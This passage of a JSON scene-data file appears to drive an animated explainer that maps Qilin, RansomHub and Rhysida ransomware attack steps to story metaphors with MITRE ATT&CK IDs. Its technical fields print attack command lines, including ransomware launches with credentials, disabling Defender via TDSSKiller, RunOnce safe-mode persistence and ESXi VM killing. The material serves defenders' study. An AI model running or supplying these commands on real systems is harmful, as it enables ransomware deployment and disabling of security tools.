          "technicalParallel": "Under the hood, the observed step executes qilin_rust.exe -d \"CORP\\svc_backup:P@ssw0rd2026!\" -p \"\\\\10.10.0.0/16\" (which executes the technical command / telemetry directive , qilin_rust.exe -d…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Down",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Automatically unlocking remote shared cabinets",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses automatically unlocking remote shared cabinets to advance toward shutting down database clerks holding files open.",
          "technicalParallel": "Using the harvested domain and vCenter/ESXi credentials, the operator invokes the Rust-compiled Qilin binary with -d DOMAIN\\Admin:Password (which calls WNetAddConnection2W to automatically authenticate…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Down Open",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Shredding every local backup copy",
          "storyExcerpt": "Behind the scenes, shredding every local backup copy captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 1 (recording AutoMountSwitch=-d DOMAIN\\User:Password , WNetAddConnection2W, TerminatedServices=VeeamBackupSvc, MSSQLSERVER, MSExchangeIS, Sophos under T1021.002): Disable…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Policy Board",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Server Vault",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Key Ring",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1021.002"
    },
    "step-3": {
      "scenarioId": "qilin-agenda-rust-chrome-cred-harvester-esxi",
      "sectionKey": "step-3",
      "sceneKind": "ran-qilin-esxi-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "Simultaneous Windows & ESXi Hypervisor ChaCha20 / AES-256-GCM Encryption (.qilin)",
      "storyCue": "Switching seamlessly between high-speed locking gears tailored for each affiliate job, the crew seals both office desktop files and basement virtual server hosts at the exact same time, leaving the enterprise paralyzed across physical and virtual floors.",
      "technicalCue": "T1486 · EXFIL & IMPACT — Qilin executes its configurable per-affiliate encryption profile (supporting ChaCha20 or AES-256-GCM with RSA-4096 key wrapping and configurable skip-step intermittent modes) across both…",
      "storyMappings": [
        {
          "storyTerm": "Tailored locking gears chosen per job",
          "technicalTerm": "Per-affiliate Qilin profile selecting ChaCha20 or AES-256-GCM with RSA wrapping",
          "tone": "amber"
        },
        {
          "storyTerm": "Basement virtual servers halted and sealed",
          "technicalTerm": "ESXi Linux ELF encryptor stopping VMs and encrypting datastore VMDK images",
          "tone": "sky"
        },
        {
          "storyTerm": "Office files locked simultaneously",
          "technicalTerm": "Multi-threaded Windows file encryption appending affiliate-specific extensions",
          "tone": "rose"
        },
        {
          "storyTerm": "Maximized cross-platform extortion pressure",
          "technicalTerm": "Synchronized Windows desktop, file server, and virtualization outage",
          "tone": "emerald"
        }
      ],
      "accentHex": "#FACC15",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-qilin-esxi-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Tailored locking gears chosen per job",
          "subtitle": "Per-affiliate Qilin profile selecting ChaCha20 or AES-256-GCM…",
          "tone": "amber"
        },
        {
          "id": "ran-qilin-esxi-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Basement virtual servers halted and sealed",
          "subtitle": "ESXi Linux ELF encryptor stopping VMs and encrypting datastore…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Per Job",
          "stageTag": "STEP 03 · SETUP",
          "title": "Tailored locking gears chosen per job",
          "storyExcerpt": "Switching seamlessly between high-speed locking gears tailored for each affiliate job, the crew seals both Windows office files and basement basement server host virtual servers at the exact…",
          "technicalParallel": "Under the hood, the observed step executes ./qilin_esxi --path /vmfs/volumes --kill-vms (Terminates ESXi VMX worlds & encrypts .vmdk/.vmx) (which executes the technical command / telemetry directive…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Basement virtual servers halted and sealed",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses basement virtual servers halted and sealed to advance toward office files locked simultaneously.",
          "technicalParallel": "Qilin executes its configurable per-affiliate encryption profile (supporting ChaCha20 or AES-256-GCM with RSA-4096 key wrapping and configurable skip-step intermittent modes) across both Windows servers…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. High-speed Each",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Maximized cross-platform extortion pressure",
          "storyExcerpt": "Behind the scenes, maximized cross-platform extortion pressure captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 11 (recording RansomwareFamily=Qilin , Agenda Ransomware-as-a-Service, CrossPlatformTargets=Windows x64 + VMware ESXi ELF64, RansomNote=QILIN-README-RECOVER.txt under T1486)…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Policy Board",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Server Vault",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Key Ring",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1486"
    }
  },
  "ransomhub-edrkiller-tdsskiller-golocks": {
    "briefing": {
      "scenarioId": "ransomhub-edrkiller-tdsskiller-golocks",
      "sectionKey": "briefing",
      "sceneKind": "ran-ransomhub-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1562.001",
      "title": "RansomHub Ransomware: Kaspersky TDSSKiller / EDRKillShifter BYOVD… — Story-to-Technical Overview",
      "storyCue": "Imagine a nimble extortion crew that brings an authentic antivirus cleanup utility and a shape-shifting driver smuggler to knock out every security guard first, then slips a special asterisk-marked wake-up note onto the building emergency-repair startup clipboard so the building reboots into stripped-down maintenance mode where guards stay asleep, and finally requires a long secret passphrase before unpacking its fast modern locking gear.",
      "technicalCue": "DEFENSE EVASION: Signed TDSSKiller.exe (`klbg.sys`) & EDRKillShifter BYOVD Sensor Termination -> DEFENSE EVASION: Safe-Mode RunOnce Persistence (`*safemode`) & Shadow Copy / Volume Mounting -> EXFIL & IMPACT: SHA-256 `-pass` Config Decryption & Curve25519 / XChaCha20 Encryption",
      "storyMappings": [
        {
          "storyTerm": "Authentic cleanup utility and shape-shifting driver smuggler",
          "technicalTerm": "Signed Kaspersky TDSSKiller.exe (klbg.sys) and EDRKillShifter BYOVD loader",
          "tone": "amber"
        },
        {
          "storyTerm": "Asterisk-marked note waking up inside stripped-down maintenance mode",
          "technicalTerm": "Safe-Mode RunOnce persistence (*safemode) paired with bcdedit safeboot reboot",
          "tone": "sky"
        },
        {
          "storyTerm": "Requiring a long secret passphrase before unpacking locking gear",
          "technicalTerm": "Mandatory 64-character hex -pass <sha256_key> decrypting embedded configuration",
          "tone": "rose"
        },
        {
          "storyTerm": "Fast modern locking gear sealing every volume",
          "technicalTerm": "Curve25519 key exchange and XChaCha20 multi-platform encryption",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#38BDF8",
      "durationSec": 18,
      "callouts": [
        {
          "id": "ran-ransomhub-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Authentic cleanup utility and…",
          "subtitle": "Signed Kaspersky TDSSKiller.exe (klbg.sys) and EDRKillShifter…",
          "tone": "amber"
        },
        {
          "id": "ran-ransomhub-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Asterisk-marked note waking up inside…",
          "subtitle": "Safe-Mode RunOnce persistence (*safemode) paired with bcdedit…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Entry Beat",
          "stageTag": "STAGE 01 · DEFENSE EVASION",
          "title": "Signed TDSSKiller.exe (`klbg.sys`) & EDRKillShifter BYOVD Sensor Termination",
          "storyExcerpt": "Right after entering the estate, the affiliate turns an authentic signed rootkit-removal utility or a shape-shifting vulnerable-driver wrapper against the building own security monitors, silencing every…",
          "technicalParallel": "Under the hood, the observed step executes TDSSKiller.exe -l C:\\Windows\\Temp\\tdss.log -dcsvc MsMpEng.exe (Abuses signed klbg.sys driver to delete/kill service) (which executes the technical command /…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Work",
          "stageTag": "STAGE 02 · DEFENSE EVASION",
          "title": "Safe-Mode RunOnce Persistence (`*safemode`) & Shadow Copy / Volume Mounting",
          "storyExcerpt": "When instructed to strike in stripped-down emergency mode, the crew pins a special asterisk-prefixed work order onto the startup board and reboots the computer into Safe Mode, where normal security…",
          "technicalParallel": "Under the hood, the observed step executes reg.exe add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"*RansomHub\" /t REG_SZ /d \"C:\\ProgramData\\rhub.exe -pass 7c9e1a...\" /f (which Modifies…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. 64-character",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "SHA-256 `-pass` Config Decryption & Curve25519 / XChaCha20 Encryption",
          "storyExcerpt": "Because the encryptor keeps its master instructions tightly sealed against curious defenders, it refuses to budge until the operator supplies a 64-character secret passkey, unlocking modern curve-based…",
          "technicalParallel": "Under the hood, the observed step executes rhub.exe -pass 7c9e1a4b8d2f0e3a5c6b9d8e7f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a -network=true (which executes the technical command / telemetry directive…",
          "accentHex": "#38BDF8",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Driver Bay",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Safe-Mode Vault",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Passkey Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "ransomhub-edrkiller-tdsskiller-golocks",
      "sectionKey": "step-1",
      "sceneKind": "ran-ransomhub-step-1",
      "stageBadge": "STEP #1 · DEFENSE EVASION",
      "title": "Signed TDSSKiller.exe (klbg.sys) & EDRKillShifter BYOVD Sensor Termination",
      "storyCue": "Right after entering the estate, the affiliate turns an authentic signed rootkit-removal utility or a shape-shifting vulnerable-driver wrapper against the building own security monitors, silencing every guard station before staging the encryptor.",
      "technicalCue": "T1562.001 · DEFENSE EVASION — After initial access via VPN appliances or ZeroLogon, the RansomHub affiliate deploys either the legitimate signed Kaspersky TDSSKiller.exe rootkit scanner (-dcsvc) or EDRKillShifter (a loader…",
      "storyMappings": [
        {
          "storyTerm": "Authentic signed rootkit-removal utility",
          "technicalTerm": "Legitimate Kaspersky TDSSKiller.exe loading signed klbg.sys to disable EDR services",
          "tone": "amber"
        },
        {
          "storyTerm": "Shape-shifting vulnerable-driver wrapper",
          "technicalTerm": "EDRKillShifter BYOVD loader unpacking vulnerable signed kernel drivers in memory",
          "tone": "sky"
        },
        {
          "storyTerm": "Silencing every guard station before locking doors",
          "technicalTerm": "Kernel-level termination of EDR and antivirus sensors prior to encryption",
          "tone": "rose"
        },
        {
          "storyTerm": "Initial perimeter entry",
          "technicalTerm": "Breach via exposed VPN appliances or ZeroLogon lateral compromise",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-ransomhub-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Authentic signed rootkit-removal utility",
          "subtitle": "Legitimate Kaspersky TDSSKiller.exe loading signed klbg.sys to…",
          "tone": "amber"
        },
        {
          "id": "ran-ransomhub-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Shape-shifting vulnerable-driver wrapper",
          "subtitle": "EDRKillShifter BYOVD loader unpacking vulnerable signed kernel…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Entry Beat",
          "stageTag": "STEP 01 · SETUP",
          "title": "Authentic signed rootkit-removal utility",
          "storyExcerpt": "Right after entering the estate, the affiliate turns an authentic signed rootkit-removal utility or a shape-shifting vulnerable-driver wrapper against the building own security monitors…",
          "technicalParallel": "Under the hood, the observed step executes TDSSKiller.exe -l C:\\Windows\\Temp\\tdss.log -dcsvc MsMpEng.exe (Abuses signed klbg.sys driver to delete/kill service) (which executes the technical command /…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Shape-shifting vulnerable-driver wrapper",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses shape-shifting vulnerable-driver wrapper to advance toward silencing every guard station before locking doors.",
          "technicalParallel": "After initial access via VPN appliances or ZeroLogon, the RansomHub affiliate deploys either the legitimate signed Kaspersky TDSSKiller.exe rootkit scanner (-dcsvc) or EDRKillShifter (a loader that…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Impact Beat",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Initial perimeter entry",
          "storyExcerpt": "Behind the scenes, initial perimeter entry captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 6 (recording LolbinAbused=Kaspersky TDSSKiller.exe , -dcsvc service deletion, SecondaryTool=EDRKillShifter BYOVD Loader, AdvisoryId=CISA AA24-242A under T1562.001): Enable…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Driver Bay",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Safe-Mode Vault",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Passkey Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1562.001"
    },
    "step-2": {
      "scenarioId": "ransomhub-edrkiller-tdsskiller-golocks",
      "sectionKey": "step-2",
      "sceneKind": "ran-ransomhub-step-2",
      "stageBadge": "STEP #2 · DEFENSE EVASION",
      "title": "Safe-Mode RunOnce Persistence (*safemode) & Shadow Copy / Volume Mounting",
      "storyCue": "When instructed to strike in stripped-down emergency mode, the crew pins a special asterisk-prefixed work order onto the startup board and reboots the computer into Safe Mode, where normal security guards never wake up yet the asterisk note still launches automatically to mount hidden storage shelves and wipe backups.",
      "technicalCue": "T1562.009 · DEFENSE EVASION — When -safeboot is passed, RansomHub writes its execution command (prefixed with an asterisk * in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce, which instructs Windows to execute the…",
      "storyMappings": [
        {
          "storyTerm": "Special asterisk-prefixed work order on the startup board",
          "technicalTerm": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce entry prefixed with *",
          "tone": "amber"
        },
        {
          "storyTerm": "Rebooting into stripped-down emergency mode",
          "technicalTerm": "Triggering Windows Safe Mode (-safeboot) where most third-party EDR agents do not load",
          "tone": "sky"
        },
        {
          "storyTerm": "Mounting hidden storage shelves",
          "technicalTerm": "Enumerating and mounting unmounted local volumes so hidden drives get encrypted",
          "tone": "rose"
        },
        {
          "storyTerm": "Wiping recovery snapshots before locking",
          "technicalTerm": "Automated Volume Shadow Copy deletion inside the quiet Safe Mode boot",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-ransomhub-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Special asterisk-prefixed work order on…",
          "subtitle": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce entry…",
          "tone": "amber"
        },
        {
          "id": "ran-ransomhub-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Rebooting into stripped-down emergency…",
          "subtitle": "Triggering Windows Safe Mode (-safeboot) where most…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Work",
          "stageTag": "STEP 02 · SETUP",
          "title": "Special asterisk-prefixed work order on the startup…",
          "storyExcerpt": "When instructed to strike in stripped-down emergency mode, the crew pins a special asterisk-prefixed work order onto the startup board and reboots the computer into Safe Mode, where normal…",
          "technicalParallel": "Under the hood, the observed step executes reg.exe add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"*RansomHub\" /t REG_SZ /d \"C:\\ProgramData\\rhub.exe -pass 7c9e1a...\" /f (which Modifies…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Mode",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Rebooting into stripped-down emergency mode",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses rebooting into stripped-down emergency mode to advance toward mounting hidden storage shelves.",
          "technicalParallel": "When -safeboot is passed, RansomHub writes its execution command (prefixed with an asterisk * in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce, which instructs Windows to execute the key even…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Mode Crew",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Wiping recovery snapshots before locking",
          "storyExcerpt": "Behind the scenes, wiping recovery snapshots before locking captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 13 (recording SafeModeRegistryTrick=Asterisk-prefixed RunOnce value , *RansomHub executes in Safe Mode, BootConfigChange=bcdedit.exe /set {current} safeboot minimal…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Driver Bay",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Safe-Mode Vault",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Passkey Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1562.009"
    },
    "step-3": {
      "scenarioId": "ransomhub-edrkiller-tdsskiller-golocks",
      "sectionKey": "step-3",
      "sceneKind": "ran-ransomhub-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "SHA-256 -pass Config Decryption & Curve25519 / XChaCha20 Encryption",
      "storyCue": "Because the encryptor keeps its master instructions tightly sealed against curious defenders, it refuses to budge until the operator supplies a 64-character secret passkey, unlocking modern curve-based locks that seal office desktops, server hosts, and virtual server racks alike.",
      "technicalCue": "T1486 · EXFIL & IMPACT — Only when supplied the exact 64-character hex password (-pass <sha256_key>) does the RansomHub binary decrypt its internal configuration in memory (preventing sandbox detonation without the…",
      "storyMappings": [
        {
          "storyTerm": "Refusing to budge without a 64-character secret passkey",
          "technicalTerm": "Mandatory -pass <sha256_key> CLI argument decrypting the embedded config",
          "tone": "amber"
        },
        {
          "storyTerm": "Tightly sealed against automated sandbox inspection",
          "technicalTerm": "Anti-analysis runtime key check preventing detonation without affiliate credentials",
          "tone": "sky"
        },
        {
          "storyTerm": "Modern curve-based locking gear",
          "technicalTerm": "Curve25519 asymmetric key exchange paired with XChaCha20 symmetric encryption",
          "tone": "rose"
        },
        {
          "storyTerm": "Uniform Go/C++ fleet across every server room",
          "technicalTerm": "Cross-platform RansomHub payloads targeting Windows, Linux, and ESXi",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-ransomhub-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Refusing to budge without a 64-character…",
          "subtitle": "Mandatory -pass <sha256_key> CLI argument decrypting the…",
          "tone": "amber"
        },
        {
          "id": "ran-ransomhub-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Tightly sealed against automated sandbox…",
          "subtitle": "Anti-analysis runtime key check preventing detonation without…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. 64-character",
          "stageTag": "STEP 03 · SETUP",
          "title": "Refusing to budge without a 64-character secret…",
          "storyExcerpt": "Because the encryptor keeps its master instructions tightly sealed against curious defenders, it refuses to budge until the operator supplies a 64-character secret passkey, unlocking modern…",
          "technicalParallel": "Under the hood, the observed step executes rhub.exe -pass 7c9e1a4b8d2f0e3a5c6b9d8e7f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a -network=true (which executes the technical command / telemetry directive…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Gear",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Tightly sealed against automated sandbox inspection",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses tightly sealed against automated sandbox inspection to advance toward modern curve-based locking gear.",
          "technicalParallel": "Only when supplied the exact 64-character hex password (-pass <sha256_key>) does the RansomHub binary decrypt its internal configuration in memory (preventing sandbox detonation without the operator CLI…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Gear",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Uniform Go/C++ fleet across every server room",
          "storyExcerpt": "Behind the scenes, uniform go/c++ fleet across every server room captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 11 (recording RansomwareFamily=RansomHub , Knight / Cyclops Code Lineage, AntiSandboxGuardrail=Requires -pass SHA-256 CLI key to decrypt embedded JSON config…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Driver Bay",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Safe-Mode Vault",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Passkey Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1486"
    }
  },
  "rhysida-ransomware-zerologon-ps-silentskill": {
    "briefing": {
      "scenarioId": "rhysida-ransomware-zerologon-ps-silentskill",
      "sectionKey": "briefing",
      "sceneKind": "ran-rhysida-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1562.004",
      "title": "Rhysida Ransomware SilentKill PowerShell Preparation, PortStarter &… — Story-to-Technical Overview",
      "storyCue": "Imagine an organized heist crew preparing a museum takeover in three calculated phases. First, they prop open a hidden basement bulkhead door and punch a custom hole through the museum security fence; next, they run an automated checklist script that unplugs over two hundred guard stations and cameras while propping the remote-entry latch open; finally, they roll a multi-lane mechanical padlocking press down every gallery and hang a bright red warning poster over every wall display.",
      "technicalCue": "PERSISTENCE: PortStarter Golang Backdoor & Windows Firewall Rule Tampering -> DEFENSE EVASION: SilentKill PowerShell Script (g.ps1) Disabling 200+ Services & Unhooking AMSI -> EXFIL & IMPACT: Multi-Threaded LibTomCrypt AES-256-CTR Encryption & Desktop Wallpaper Lock (.rhysida)",
      "storyMappings": [
        {
          "storyTerm": "Hidden bulkhead door punching a hole through the security fence",
          "technicalTerm": "PortStarter Golang backdoor adding Windows Firewall allow rules via netsh.exe",
          "tone": "amber"
        },
        {
          "storyTerm": "Automated script unplugging two hundred guard stations and cameras",
          "technicalTerm": "SilentKill PowerShell script (g.ps1) unhooking AMSI, killing 200+ services, and enabling RestrictedAdmin",
          "tone": "sky"
        },
        {
          "storyTerm": "Multi-lane mechanical padlocking press rolled across every gallery",
          "technicalTerm": "psexec.exe -d -s deploying MinGW rhysida.exe with LibTomCrypt AES-256-CTR encryption",
          "tone": "rose"
        },
        {
          "storyTerm": "Bright red warning poster hung over every wall display",
          "technicalTerm": "Desktop wallpaper replacement, .rhysida extensions, and CriticalBreachDetected.pdf",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#F59E0B",
      "durationSec": 18,
      "callouts": [
        {
          "id": "ran-rhysida-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Hidden bulkhead door punching a hole…",
          "subtitle": "PortStarter Golang backdoor adding Windows Firewall allow…",
          "tone": "amber"
        },
        {
          "id": "ran-rhysida-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Automated script unplugging two hundred…",
          "subtitle": "SilentKill PowerShell script (g.ps1) unhooking AMSI, killing…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Door Hole",
          "stageTag": "STAGE 01 · PERSISTENCE",
          "title": "PortStarter Golang Backdoor & Windows Firewall Rule Tampering",
          "storyExcerpt": "Right after slipping inside the perimeter, the crew hides a compact custom courier engine inside a shared utility closet and commands the building own firewall guard to cut a fresh permanent doorway for…",
          "technicalParallel": "The shared use of PortStarter and SilentKill provided high-confidence forensic proof that Vice Society (DEV-0832) operators transitioned directly to the Rhysida ransomware payload in mid-2023.",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Crew Off",
          "stageTag": "STAGE 02 · DEFENSE EVASION",
          "title": "SilentKill PowerShell Script (g.ps1) Disabling 200+ Services & Unhooking AMSI",
          "storyExcerpt": "Before locking a single vault, the crew fires a sweeping silence script that first blinds the script-inspection window, switches off more than two hundred database and backup services so every file lock…",
          "technicalParallel": "Enabling DisableRestrictedAdmin = 0 across the domain allows the operator to Pass-the-Hash over RDP (mstsc.exe /restrictedadmin) without exposing their own cleartext credentials on target hosts.",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Down",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "Multi-Threaded LibTomCrypt AES-256-CTR Encryption & Desktop Wallpaper Lock (.rhysida)",
          "storyExcerpt": "Pushing their heavy padlocking press down every hallway simultaneously via the remote-service tool, the crew runs parallel locking gears across every office cabinet, stamps a bright ransom notice onto…",
          "technicalParallel": "Unlike most ransomware families that drop .txt or .hta ransom notes, Rhysida generates a standalone .pdf document (CriticalBreachDetected.pdf) in every encrypted directory.",
          "accentHex": "#F59E0B",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Fence Hole",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Lock Press",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Multi-Lane",
          "position": [
            0.3,
            6.6,
            9.2
